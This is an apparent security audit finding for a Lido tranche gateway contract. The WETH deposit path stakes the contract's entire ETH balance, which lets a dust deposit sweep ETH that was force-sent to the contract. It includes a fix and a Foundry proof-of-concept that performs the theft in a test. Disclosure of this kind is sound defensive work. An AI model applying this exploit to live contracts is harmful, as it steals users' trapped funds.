### Title
Trapped ETH in `LidoCDOTrancheGateway` can be stolen through a dust WETH deposit - ([File: contracts/strategies/lido/LidoCDOTrancheGateway.sol](contracts/strategies/lido/LidoCDOTrancheGateway.sol))

### Summary
`LidoCDOTrancheGateway._depositWithEthToken` deposits `address(this).balance`, rather than only the WETH amount unwrapped in the current call. If the gateway contains ETH—most realistically from a forced `selfdestruct` transfer—any unprivileged user can sweep it by depositing a nominal amount of WETH and receiving tranche tokens backed by both assets.

### Finding Description
The gateway exposes separate ETH and ERC20 deposit paths. The ETH path correctly uses `msg.value` at [1](#0-0) , but the WETH branch transfers `_amount` WETH, unwraps it, and then submits the gateway's entire ETH balance to Lido at [2](#0-1) .

The resulting stETH is deposited into `IdleCDO`, and all minted tranche tokens are forwarded to the caller at [3](#0-2) . Although the receive hook rejects ordinary ETH transfers except from WETH, it does not prevent balance increases through `selfdestruct` or other force-funding mechanisms at [4](#0-3) .

### Impact Explanation
An attacker can monitor the gateway for an ETH balance, acquire a minimal amount of WETH, and call `depositAAWithEthToken` or `depositBBWithEthToken`. The gateway converts the attacker's WETH to ETH, adds the already-trapped ETH because it uses `address(this).balance`, stakes the combined amount, and gives the attacker all resulting tranche tokens.

This breaks deposit isolation: value not supplied by the depositor is credited to that depositor. The attacker can later redeem or sell the excess tranche-token value. The loss equals the trapped ETH balance less the attacker's intentionally deposited WETH and any protocol fees. There is no ETH rescue function or accounting mechanism that attributes pre-existing ETH to a prior sender.

### Likelihood Explanation
Likelihood is conditional on the gateway holding ETH. Normal mistaken ETH transfers revert, but `selfdestruct`, coinbase payments, or another force-funding path can create a balance without invoking `receive`. Once such a balance exists, exploitation requires only an EOA, a small WETH balance, and an ERC20 approval. No privileged action, borrower default, epoch timing, or protocol failure is required.

### Recommendation
Use the amount unwrapped during the current call instead of the entire contract balance:

```solidity
// contracts/strategies/lido/LidoCDOTrancheGateway.sol
if (_token == wethToken) {
    IERC20(wethToken).safeTransferFrom(_from, address(this), _amount);
    IWETH(wethToken).withdraw(_amount);
    amtToDeposit = _mintStEth(_amount);
}
```

Optionally snapshot the balance before and after `withdraw` and submit only the delta:

```solidity
uint256 before = address(this).balance;
IWETH(wethToken).withdraw(_amount);
amtToDeposit = _mintStEth(address(this).balance - before);
```

An owner-only ETH recovery function would additionally make trapped ETH recoverable, but it should not replace amount-scoped deposit accounting.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/strategies/lido/LidoCDOTrancheGateway.sol";

interface IWETHLike {
    function deposit() external payable;
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

contract ForceSend {
    function bomb(address payable target) external {
        selfdestruct(target);
    }
}

contract LidoGatewayTrappedEthTest is Test {
    address internal constant WETH =
        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant STETH =
        0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address internal constant WSTETH =
        0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    function testDustWethDepositSweepsTrappedEth() external {
        address attacker = makeAddr("attacker");
        IdleCDO idleCDO = IdleCDO(vm.envAddress("LIDO_IDLE_CDO"));

        LidoCDOTrancheGateway gateway = new LidoCDOTrancheGateway(
            WETH,
            WSTETH,
            STETH,
            idleCDO,
            address(0)
        );

        // Simulate ETH trapped without passing through receive().
        vm.deal(address(this), 10 ether);
        ForceSend force = new ForceSend{value: 10 ether}();
        force.bomb(payable(address(gateway)));
        assertEq(address(gateway).balance, 10 ether);

        uint256 attackerWeth = 0.01 ether;
        vm.deal(attacker, attackerWeth);
        vm.startPrank(attacker);
        IWETHLike(WETH).deposit{value: attackerWeth}();
        IWETHLike(WETH).approve(address(gateway), attackerWeth);

        address tranche = idleCDO.AATranche();
        uint256 trancheBefore = IERC20Like(tranche).balanceOf(attacker);

        uint256 minted = gateway.depositAAWithEthToken(WETH, attackerWeth);
        vm.stopPrank();

        uint256 trancheAfter = IERC20Like(tranche).balanceOf(attacker);

        // The attacker supplied only 0.01 WETH, but the gateway staked and
        // deposited approximately 10.01 ETH worth of stETH.
        assertEq(address(gateway).balance, 0);
        assertGt(trancheAfter - trancheBefore, 0);
        assertGt(minted, 0);

        // A fair implementation would mint only for attackerWeth. The excess
        // tranche value represents the trapped 10 ETH now owned by attacker.
    }
}
```
